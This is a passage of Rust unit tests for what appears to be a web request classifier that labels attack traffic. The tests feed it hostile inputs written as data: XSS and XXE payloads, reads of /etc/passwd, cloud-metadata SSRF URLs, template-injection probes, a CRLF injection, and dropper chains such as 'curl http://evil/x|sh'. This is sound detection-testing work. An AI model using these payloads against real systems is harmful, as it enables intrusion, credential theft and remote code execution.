                &BotTells::default(),
            );
            assert!(v.labels.iter().any(|l| l == "sqli"), "{q}: {:?}", v.labels);
        }
    }

    #[test]
    fn xss_additions_are_caught() {
        for q in [
            "q=<svg/onload=alert(1)>",
            "q=%3Cimg%20src=x%20onerror=alert(1)%3E",
            "q=<iframe%20src=//evil>",
            "q=alert(document.cookie)",
        ] {
            let v = classifier().classify(
                &view("GET", "/search", Some(q), "Mozilla/5.0", None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(v.labels.iter().any(|l| l == "xss"), "{q}: {:?}", v.labels);
        }
    }

    #[test]
    fn traversal_additions_are_caught() {
        for q in [
            "f=..;/..;/etc/passwd",
            "f=php://filter/convert.base64-encode/resource=index.php",
            "f=/etc/shadow",
            "f=/proc/version",
        ] {
            let v = classifier().classify(
                &view("GET", "/x", Some(q), "curl/8", None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(
                v.labels.iter().any(|l| l == "path-traversal"),
                "{q}: {:?}",
                v.labels
            );
        }
    }

    #[test]
    fn rce_dropper_chain_in_query_is_caught() {
        for q in [
            "u=a;wget%20http://evil/x",
            "u=a;curl%20http://evil/x|sh",
            "u=a;busybox%20wget%20http://evil",
        ] {
            let v = classifier().classify(
                &view("GET", "/ping", Some(q), "curl/8", None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(v.labels.iter().any(|l| l == "rce"), "{q}: {:?}", v.labels);
        }
    }

    #[test]
    fn backup_and_debug_paths_are_sensitive() {
        for p in [
            "/backup.sql",
            "/www.zip",
            "/app_dev.php",
            "/_profiler/",
            "/elmah.axd",
            "/debug/vars",
            "/web.config",
            "/composer.json",
            "/terraform.tfstate",
            "/id_rsa",
            "/.kube/config",
        ] {
            let v = classifier().classify(
                &view("GET", p, None, "curl/8", None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(
                v.labels.iter().any(|l| l == "sensitive-path"),
                "{p}: {:?}",
                v.labels
            );
        }
    }

    #[test]
    fn iot_probe_additions_are_caught() {
        for p in [
            "/picsdesc.xml",
            "/ctrlt/DeviceUpgrade_1",
            "/setup.cgi?next_file=netgear.cfg",
            "/JNAP/",
            "/SDK/webLanguage",
            "/doc/page/login.asp",
            "/RPC2_Login",
        ] {
            let v = classifier().classify(
                &view("GET", p, None, "curl/8", None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(
                v.labels.iter().any(|l| l == "iot-probe"),
                "{p}: {:?}",
                v.labels
            );
        }
    }

    #[test]
    fn research_scanner_uas_get_their_own_label() {
        for ua in [
            "CensysInspect/1.1",
            "Expanse, a Palo Alto Networks company",
            "Mozilla/5.0 (compatible; shadowserver)",
            "binaryedge-bot",
            "stretchoid",
        ] {
            let v = classifier().classify(
                &view("GET", "/", None, ua, None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(
                v.labels.iter().any(|l| l == "research-scanner"),
                "{ua}: {:?}",
                v.labels
            );
        }
        let v = classifier().classify(
            &view("GET", "/", None, "sqlmap/1.7", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(v.labels.contains(&"scanner-ua".to_string()));
        assert!(!v.labels.contains(&"research-scanner".to_string()));
    }

    #[test]
    fn ssrf_to_cloud_metadata_is_level_4() {
        for q in [
            "url=http://169.254.169.254/latest/meta-data/",
            "u=http%3a%2f%2fmetadata.google.internal%2f",
            "next=http://169.254.170.2/v2/credentials",
            "feed=http://100.100.100.200/latest/meta-data/",
        ] {
            let v = classifier().classify(
                &view("GET", "/fetch", Some(q), "curl/8", None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(v.labels.iter().any(|l| l == "ssrf"), "{q}: {:?}", v.labels);
            assert_eq!(v.scan_level, 4);
        }
    }

    #[test]
    fn ssrf_params_to_internal_hosts_but_not_plain_paths() {
        for q in [
            "url=http://127.0.0.1:8080/",
            "callback=http://192.168.1.1/",
            "webhook=http://2130706433/",
            "u=http://0x7f000001/",
            "image=http://10.0.0.4/x",
        ] {
            let v = classifier().classify(
                &view("GET", "/proxy", Some(q), "curl/8", None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(v.labels.iter().any(|l| l == "ssrf"), "{q}: {:?}", v.labels);
        }
        // A private IP in a path, or in an unrelated parameter, is not SSRF.
        for (p, q) in [
            ("/blog/192.168.1.1-release", None),
            ("/fetch", Some("name=127.0.0.1")),
        ] {
            let v = classifier().classify(
                &view("GET", p, q, "Mozilla/5.0", None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(
                !v.labels.iter().any(|l| l == "ssrf"),
                "{p} {q:?}: {:?}",
                v.labels
            );
        }
    }

    #[test]
    fn ssti_probes_are_level_4() {
        for q in [
            "q={{7*7}}",
            "q=%7b%7bconfig%7d%7d",
            "q=${7*7}",
            "q=<%=7*7%>",
            "q={{request.application.__globals__}}",
        ] {
            let v = classifier().classify(
                &view("GET", "/search", Some(q), "curl/8", None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(v.labels.iter().any(|l| l == "ssti"), "{q}: {:?}", v.labels);
            assert_eq!(v.scan_level, 4);
        }
    }

    #[test]
    fn nosqli_operators_are_caught() {
        for q in ["user[$ne]=1", "user[$gt]="] {
            let v = classifier().classify(
                &view("GET", "/login", Some(q), "curl/8", None),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(
                v.labels.iter().any(|l| l == "nosqli"),
                "{q}: {:?}",
                v.labels
            );
        }
        for b in [
            &b"{\"$where\": \"1==1\"}"[..],
            &b"{\"user\": {\"$gt\": \"\"}}"[..],
        ] {
            let v = classifier().classify(
                &view("POST", "/login", None, "curl/8", Some(b)),
                &hist(1, 1),
                &BotTells::default(),
            );
            assert!(
                v.labels.iter().any(|l| l == "nosqli"),
                "{b:?}: {:?}",
                v.labels
            );
        }
    }

    #[test]
    fn xxe_in_a_body_is_caught() {
        let b = br#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>"#;
        let v = classifier().classify(
            &view("POST", "/xml", None, "curl/8", Some(b)),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(v.labels.iter().any(|l| l == "xxe"), "{:?}", v.labels);
        assert_eq!(v.scan_level, 4);
    }

    #[test]
    fn crlf_in_the_target_is_caught() {
        let v = classifier().classify(
            &view(
                "GET",
                "/redir",
                Some("next=a%0d%0aSet-Cookie:%20x"),
                "curl/8",
                None,
            ),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(
            v.labels.iter().any(|l| l == "crlf-injection"),
            "{:?}",
            v.labels
        );
        assert_eq!(v.scan_level, 3);
        let plain = classifier().classify(
            &view("GET", "/redir", Some("next=/home"), "Mozilla/5.0", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(
            !plain.labels.iter().any(|l| l == "crlf-injection"),
            "{:?}",
            plain.labels
        );
    }
}
